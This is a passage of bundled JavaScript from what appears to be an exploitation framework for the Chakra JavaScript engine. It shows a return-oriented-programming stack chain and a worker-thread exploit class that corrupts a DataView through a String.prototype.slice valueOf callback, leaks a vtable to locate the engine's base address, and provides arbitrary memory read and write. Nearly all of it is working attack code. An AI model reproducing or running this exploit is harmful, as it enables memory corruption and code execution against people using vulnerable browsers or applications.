            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0, 0x40000));
            i++;
            write64(i32, i, gadgets.popRbpReturn);
            i++;
            write64(i32, i, savedRbpAddr.load());
            i++;
            write64(i32, i, gadgets.popRspReturn);
            i++;
            write64(i32, i, savedRbpAddr.add(2));
            i++;
            savedRbpAddr[0] = stk;
            returnValAddr = stk;
        }
    });
    return returnValAddr[0];
}

/* harmony default export */ __webpack_exports__["a"] = (ChakraExploit);


/***/ }),
/* 3 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_baseexploit__ = __webpack_require__(1);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_chakraexploit__ = __webpack_require__(2);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__ = __webpack_require__(4);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_integer__ = __webpack_require__(0);
/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "BaseExploit", function() { return __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a"]; });
/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraExploit", function() { return __WEBPACK_IMPORTED_MODULE_1_chakraexploit__["a"]; });
/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraThreadExploit", function() { return __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__["a"]; });
/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "Integer", function() { return __WEBPACK_IMPORTED_MODULE_3_integer__["a"]; });








/***/ }),
/* 4 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_chakraexploit__ = __webpack_require__(2);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_integer__ = __webpack_require__(0);



/**
 * Constructs an exploit class for a worker script. Used in concert with {@link ChakraExploit#Thread} to support multithreading.
 *
 * @augments ChakraExploit
 * @class
 * @constructor
 */
function ChakraThreadExploit() {
    __WEBPACK_IMPORTED_MODULE_0_chakraexploit__["a" /* default */].call(this);

    var dvManager = new DataView(new ArrayBuffer(0x1000));
    var dvWorker = new DataView(new ArrayBuffer(0x1000));
    this.dvWorker = dvWorker;
    this.dvManager = dvManager;

    eval('String.prototype.slice').call('', {
        valueOf: function () {
            postMessage('CHAKRA_EXPLOIT');
            while (dvManager.getInt32(0) == 0) {};
        }
    }, 0, 0, 0, 0, 0x41424344, dvWorker, dvManager, 0x41414141);
    
    var vtable = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](dvManager.getInt32(0, true), dvManager.getInt32(4, true));
    this.vtable = vtable;
    this.chakraBase = this.findModuleBase(vtable);
    this.initChakra(vtable);
}
ChakraThreadExploit.prototype = Object.create(__WEBPACK_IMPORTED_MODULE_0_chakraexploit__["a" /* default */].prototype);
ChakraThreadExploit.prototype.constructor = ChakraThreadExploit;
/**
 * Arbitrary memory read using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {integer} size Bit size
 * @returns {Integer}
 */
ChakraThreadExploit.prototype.read = function (address, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.dvWorker.getInt8(0, true), 0, true);
        case 16: return new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.dvWorker.getInt16(0, true), 0, true);
        case 32: return new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.dvWorker.getInt32(0, true), 0, true);
        case 64: return new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.dvWorker.getInt32(0, true), this.dvWorker.getInt32(4, true), true);
    }
}
/**
 * Arbitrary memory write using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {Integer} value Value to write
 * @param {integer} size Bit size
 */
ChakraThreadExploit.prototype.write = function (address, value, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return this.dvWorker.setInt8(0, value.low|0, true);
        case 16: return this.dvWorker.setInt16(0, value.low|0, true);
        case 32: return this.dvWorker.setInt32(0, value.low|0, true);
        case 64:
            this.dvWorker.setInt32(0, value.low|0, true);
            this.dvWorker.setInt32(4, value.high|0, true);
    }
}

/* harmony default export */ __webpack_exports__["a"] = (ChakraThreadExploit);


/***/ })
/******/ ]);